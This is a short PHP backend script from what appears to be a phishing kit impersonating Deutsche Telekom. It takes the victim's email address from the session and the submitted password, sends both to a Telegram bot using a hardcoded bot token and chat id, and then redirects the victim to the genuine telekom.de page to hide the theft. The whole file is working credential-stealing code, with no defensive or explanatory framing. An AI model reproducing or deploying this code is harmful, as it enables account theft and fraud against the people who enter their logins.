<?php
session_start();
if(($_SESSION['email'] != "") AND ($_POST['s4'] != "")   )
{
	
	
$ip = getenv("REMOTE_ADDR");

$message .= "Username	: ".$_SESSION['email']."\n";

$message .= "Password	: ".$_POST['s4']."\n";


$token = "7684084954:AAEnEwI6Aj_0keVQOZUfz2wXCg9zEce9FIk";

$data = [
    $message => '',
    'chat_id' => '7494979988'
];

file_get_contents("https://api.telegram.org/bot$token/sendMessage?&text=$body" . http_build_query($data) );


echo "<meta http-equiv='refresh' content='0; url=https://www.telekom.de/start?cgi=GiELKO3wYgb73SkZHcabpx57rVT8RQgiiAohZwh067Pf9jqiAMA3n55UAdzdQBRNvcgI3qsG3aGiDzWnC3O4FPRkDXr6VwYkuCzMy4yEiLJh97'/>";
}
	else {
     echo "<meta http-equiv='refresh' content='0; url=../Select/index.php' />";
}

?>